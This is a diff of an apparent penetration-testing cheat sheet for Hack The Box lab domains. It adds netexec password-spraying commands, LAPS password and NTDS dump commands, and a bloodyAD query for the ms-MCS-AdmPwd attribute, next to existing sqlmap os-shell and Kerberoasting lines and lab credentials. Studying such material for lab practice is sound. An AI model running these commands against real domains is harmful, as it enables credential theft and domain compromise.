@@ -765,7 +765,7 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 
 ```
 # run bloodhound to colect data 
-bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.10.11.69
+bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.10.11.69 --zip
 
 #  another run bloodhound ( recomment becase can colllect all certtemplate ) 
 rusthound-ce -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -z 
@@ -797,6 +797,15 @@ netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --users
 
 # list shares 
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
+
+# try auth with user and pass in 2 file ( no  bruteforce ) 
+netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --no-bruteforce --continue-on-success
+
+# try auth with user and pass in 2 file  
+netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --continue-on-success
+
+# p.agila can read the LAPS password from the ms-MCS-AdmPwd property  ( p.agila need have   ReadLAPSPassword permission) 
+netexec smb dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --laps --ntds
 
 # Kerberoasting 
 netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoasting -
@@ -844,6 +853,9 @@ bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb se
 
 # give Sam GenericAll over John  ( Sam need have owner permission to John )
 bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb add genericAll john sam
+
+# sam can read the LAPS password from the ms-MCS-AdmPwd property  ( sam need have   ReadLAPSPassword permission) 
+bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb get object 'DC$' --attr ms-mcs-AdmPwd
 
 
 
